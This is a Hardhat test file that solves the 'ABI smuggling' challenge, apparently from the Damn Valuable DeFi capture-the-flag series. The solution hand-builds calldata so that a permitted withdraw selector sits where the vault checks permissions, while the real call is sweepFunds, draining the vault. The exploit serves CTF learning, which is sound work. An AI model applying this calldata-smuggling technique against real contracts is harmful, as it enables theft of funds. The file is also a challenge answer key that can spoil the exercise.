const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const abis = [
            `function execute(address,bytes)`,
            `function withdraw(address,address,uint256)`,
            `function sweepFunds(address,address)`,
        ];
        const ifaces = new ethers.utils.Interface(abis);
        const selector0 = ifaces.getSighash("execute");
        const selector1 = ifaces.getSighash("withdraw");
        const selector2 = ifaces.getSighash("sweepFunds");
        let abiCoder = ethers.utils.defaultAbiCoder;
        let dest0 = abiCoder.encode(["address"],[vault.address]);
        let arg0offset = abiCoder.encode(["uint256"],[100]);
        let padding = abiCoder.encode(["uint256"],[0]);
        let fakeSelector = selector1;
        let arg0len = abiCoder.encode(["uint256"], [68]);
        //let realSelector = selector2;
        let arg1 = ifaces.encodeFunctionData("sweepFunds", [recovery.address, token.address]);
        let calldata = ethers.utils.hexConcat([
            selector0,
            dest0,
            arg0offset,
            padding,
            fakeSelector,
            arg0len,
            arg1,
        ]);
        const tx = {
            from: player.address,
            to:  vault.address,
            data: calldata,
            gasLimit: 3000000,
        };
        await player.sendTransaction(tx);

    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
